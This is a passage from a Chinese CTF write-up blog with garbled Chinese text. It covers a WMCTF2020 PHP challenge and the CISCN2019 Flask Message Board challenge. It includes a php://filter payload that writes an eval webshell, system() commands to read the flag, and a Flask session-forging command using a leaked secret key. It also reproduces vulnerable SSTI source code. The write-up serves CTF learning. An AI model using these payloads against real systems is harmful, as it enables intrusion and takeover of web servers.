&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">urldecode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">urldecode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$aaa&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">$char&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$char&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#39;: &amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$aaa&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æˆ‘ä»¬é€‰æ‹©rot13ç»•è¿‡&lt;/p>
&lt;pre tabindex="0">&lt;code>php://filter/zlib.deflate|string.tolower|zlib.inflate|?&amp;gt;&amp;lt;?php%0deval($_GET[1]);?&amp;gt;/resource=Cyc1e.php
&lt;/code>&lt;/pre>&lt;p>ä¸Šä¼ çš„å†…å®¹å°±ä¼šåˆ°Cycle.phpä¸­ï¼Œ&lt;code>?1=system('ls');&lt;/code>ï¼Œ&lt;code>?1=system('cat /flag_2233_elkf3ifj34ij3orf3fk4');&lt;/code>&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://cyc1e183.github.io/2020/08/04/WMctf2020-Checkin%E5%87%BA%E9%A2%98%E6%83%B3%E6%B3%95-%E9%A2%98%E8%A7%A3/">wp&lt;/a>&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
***[CISCN2019 æ€»å†³èµ› Day1 Web3]Flask Message Board
&lt;/h4>
&lt;/summary>
&lt;p>flaskï¼Œé¡µé¢æœ‰ä¸‰ä¸ªè¾“å…¥æ¡†ï¼Œè¿˜æœ‰æ ‡å¿—æ€§çš„sessionï¼ŒAuthorè¾“å…¥æ¡†å¤„å­˜åœ¨SSTIï¼Œå°è¯•èŽ·å–keyæ¥ä¼ªé€ session&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211211161219803.png" alt="image-20211211161219803">&lt;/p>
&lt;p>&lt;code>'SECRET_KEY': '1|i|I||i1ili|IlIil11lIIl|ii|1|i|l||li|lI'&lt;/code>&lt;/p>
&lt;p>è¿™é‡Œä¼ªé€ çš„æ—¶å€™è¦æ³¨æ„flask session cookie managerè§£å¯†å‡ºæ¥çš„æ—¶å€™æŠŠFalseçš„å¤§å†™ç»™åŽ»æŽ‰äº†ï¼Œæˆ‘ä»¬æž„é€ å›žåŽ»çš„æ—¶å€™åº”è¯¥ç”¨å¤§å†™å¼€å¤´çš„&lt;/p>
&lt;pre tabindex="0">&lt;code>python3 flask_session_cookie_manager3.py encode -s '1|i|I||i1ili|IlIil11lIIl|ii|1|i|l||li|lI' -t &amp;quot;{'admin':True}&amp;quot;
&lt;/code>&lt;/pre>&lt;p>åˆ°/adminå¤„æœ‰æ–‡ä»¶ä¸Šä¼ ç‚¹&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211211161952272.png" alt="image-20211211161952272">&lt;/p>
&lt;p>çœ‹é¡µé¢æºç å‘çŽ°è¿˜æœ‰æç¤º&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211211162036595.png" alt="image-20211211162036595">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211211162331506.png" alt="image-20211211162331506">&lt;/p>
&lt;p>ä¸‹è½½/admin/model_downloadï¼Œå¾—åˆ°è¿™ä¹ˆä¸ªçŽ©æ„&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211211162228429.png" alt="image-20211211162228429">&lt;/p>
&lt;p>/admin/source_thanoså¯ä»¥ç›´æŽ¥è®¿é—®&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211211162359950.png" alt="image-20211211162359950">&lt;/p>
&lt;p>å°±ä»–å¦ˆç¦»è°±ï¼Œè¿™ä¸ªæºç æ˜¯éšæœºæ˜¾ç¤ºä¸€éƒ¨åˆ†ï¼Œä½†æ˜¯æ˜¾ç¤ºä½ç½®å›ºå®šï¼Œå¾—æžä¸ªè„šæœ¬åšå¤åŽŸ&lt;/p>
&lt;pre tabindex="0">&lt;code>import requests
url = 'http://8567734a-8c12-4f70-bfee-6f10e978f956.node3.buuoj.cn/admin/source_thanos'
r = requests.get(url)
source = r.text
for j in range(10):
r = requests.get(url)
for i in range(len(source)):
if source[i].isspace():
source = source[:i] + r.text[i] + source[i+1:]
print(source)
&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># coding=utf8&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">flask&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">flash&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">send_file&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">random&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">datetime&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">datetime&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">zipfile&lt;/span>
&lt;span style="color:#75715e"># init app&lt;/span>
&lt;span style="color:#111">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__name__&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">secret_key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">choice&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;il1I|&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">40&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">secret_key&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">flask&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">Response&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">flask&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">session&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">flask&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">redirect&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">url_for&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">safe_join&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">abort&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">flask&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">render_template_string&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">data&lt;/span>
&lt;span style="color:#111">post_storage&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">data&lt;/span>
&lt;span style="color:#111">site_title&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;A Flask Message Board&amp;#34;&lt;/span>
&lt;span style="color:#111">site_description&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;Just leave what you want to say.&amp;#34;&lt;/span>
&lt;span style="color:#75715e"># %% tf/load.py&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">tensorflow&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">tf&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">tensorflow.python&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pywrap_tensorflow&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">init&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">model_path&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#d88200"> This model is given by a famous hacker !
&lt;/span>&lt;span style="color:#d88200"> &amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">new_sess&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">tf&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Session&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">meta_file&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">model_path&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;.meta&amp;#34;&lt;/span>
&lt;span style="color:#111">model&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">model_path&lt;/span>
&lt;span style="color:#111">saver&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">tf&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">train&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">import_meta_graph&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">meta_file&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">saver&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">restore&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">new_sess&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">model&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">new_sess&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">renew&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sess&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">model_path&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">sess&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">init&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">model_path&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">predict&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sess&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#d88200"> :param x: input number x
&lt;/span>&lt;span style="color:#d88200"> sess: tensorflow session
&lt;/span>&lt;span style="color:#d88200"> :return: b&amp;#39;You are: *&amp;#39;
&lt;/span>&lt;span style="color:#d88200"> &amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">y&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">sess&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">graph&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get_tensor_by_name&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;y:0&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">y_out&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">sess&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">y&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#34;x:0&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">y_out&lt;/span>
&lt;span style="color:#111">tf_path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;tf/detection_model/detection&amp;#34;&lt;/span>
&lt;span style="color:#111">sess&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">init&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">tf_path&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># %% tf end&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">check_bot&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">input_str&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">predict&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sess&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">sum&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">map&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ord&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">input_str&lt;/span>&lt;span style="color:#111">)))&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">r&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">isinstance&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">decode&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#f92672">**&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">safe_join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">template_folder&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;utf8&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">template&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;name&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;anonymous&amp;#39;&lt;/span>&lt;span style="color:#111">)[:&lt;/span>&lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#75715e"># Someone call me to add a remembered_name function&lt;/span>
&lt;span style="color:#75715e"># But I&amp;#39;m just familiar with PHP !!!&lt;/span>
&lt;span style="color:#75715e"># return render_template_string(&lt;/span>
&lt;span style="color:#75715e"># template.replace(&amp;#39;$remembered_name&amp;#39;, name)&lt;/span>
&lt;span style="color:#75715e"># .replace(&amp;#39;$site_description&amp;#39;, site_description)&lt;/span>
&lt;span style="color:#75715e"># .replace(&amp;#39;$site_title&amp;#39;, site_title), **args)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template_string&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#111">template&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;$remembered_name&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">site_description&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">site_description&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">site_title&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">site_title&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#f92672">**&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">index&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">global&lt;/span> &lt;span style="color:#111">post_storage&lt;/span>
&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;admin&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;admin&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">False&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">post_storage&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">20&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">post_storage&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">post_storage&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">20&lt;/span>&lt;span style="color:#111">:]&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;index.html&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">posts&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">post_storage&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/post&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">methods&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">add_post&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">title&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">form&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;title&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;[no title]&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">content&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">form&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;content&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;[no content]&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">form&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;author&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;anonymous&amp;#39;&lt;/span>&lt;span style="color:#111">)[:&lt;/span>&lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">check_result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">check_bot&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">content&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#111">check_result&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">endswith&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;Human&amp;#39;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">flash&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;reject because &lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200"> or hacker&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">check_result&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">redirect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">post_storage&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#39;title&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">title&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;content&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">content&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;author&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;date&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">datetime&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">now&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">strftime&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;%B &lt;/span>&lt;span style="color:#d88200">%d&lt;/span>&lt;span style="color:#d88200">, %Y &lt;/span>&lt;span style="color:#d88200">%X&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">)})&lt;/span>
&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;name&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span> &lt;span style="color:#75af00">Exception&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">flash&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;Something wrong, contact admin.&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">redirect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/admin/model_download&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">model_download&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#d88200"> Download current model.
&lt;/span>&lt;span style="color:#d88200"> &amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;admin&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
